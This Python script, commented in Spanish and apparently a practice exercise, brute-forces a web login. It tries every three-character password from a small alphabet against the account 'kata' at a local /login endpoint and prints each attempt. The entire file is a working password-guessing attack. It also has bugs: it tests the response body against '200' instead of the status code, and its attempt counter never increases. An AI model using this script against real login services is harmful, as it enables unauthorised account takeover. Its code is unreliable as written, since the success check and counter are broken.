import time
import requests 
import sys

def combinaciones(alfabeto, longitud):
    if longitud == 1:
        for caracter in alfabeto:
            yield caracter
    else:
        for caracter in alfabeto:
            for sub_combinacion in combinaciones(alfabeto, longitud - 1):
                yield caracter + sub_combinacion


url_login = "http://127.0.0.1:8000/login"
usuario_ataque = "kata" 
alfabeto = "0123456789abcdnABCDN!@#." 
longitud_maxima = 3 


print(f" Ataque contra {usuario_ataque}")

tiempo_inicio = time.time(); intentos = 0; clave_encontrada = False 

for intento_actual in combinaciones(alfabeto, longitud_maxima):
    try:
        resp = requests.post(
            url_login,
            json={"nombre_usuario": usuario_ataque, "contrasena": intento_actual},
            timeout=1
        )

        # Imprime código y cuerpo para debug
        print(usuario_ataque, intento_actual, resp.status_code, resp.text)

        # Comprueba el código HTTP
        if resp.text == "200":
            print("Contraseña encontrada:", intento_actual)
            sys.exit(0)

    except requests.exceptions.RequestException as e:
        # Timeout, conexión denegada, etc.
        print("Error en la petición:", e)
    
if not clave_encontrada:
    print(f"\nContraseña no encontrada después de {intentos} intentos.")
    
